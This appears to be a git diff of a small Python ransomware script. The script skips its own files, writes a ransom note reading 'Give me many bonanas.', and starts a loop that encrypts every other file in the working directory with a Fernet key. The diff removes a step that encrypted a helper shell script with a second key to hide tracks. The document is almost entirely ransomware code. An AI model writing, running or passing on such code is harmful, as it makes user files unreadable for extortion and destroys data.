@@ -11,7 +11,7 @@ key = Fernet.generate_key()
 
 
 for file in os.listdir():
-    if file == "monsterwith21faces.py" or file == "store.key" or file == "cyanide.py" or file == "ransom_note.txt" or file == "run_this.sh" or file == "after_ransom_is_given_run_this.sh":
+    if file == "monsterwith21faces.py" or file == "store.key" or file == "cyanide.py" or file == "ransom_note.txt" or file == "after_ransom_is_given_run_this.sh":
         continue
     if os.path.isfile(file):
         files.append(file)
@@ -23,18 +23,6 @@ note = "Give me many bonanas."
 
 with open("ransom_note.txt", "w") as ransom_note:
     ransom_note.write(note)
-
-hideur = Fernet.generate_key()
-with open("store2.key", "wb") as second_key:
-    second_key.write(hideur)
-
-
-with open("run_this.sh", "rb") as hide_ur_tracks:
-    contents = hide_ur_tracks.read()
-    contents_encrypted = Fernet(hideur).encrypt(contents)
-with open("run_this.sh", "wb") as hide_ur_tracks:
-    hide_ur_tracks.write(contents_encrypted)
-
 
 for file in files:
     with open(file, "rb") as target_data:
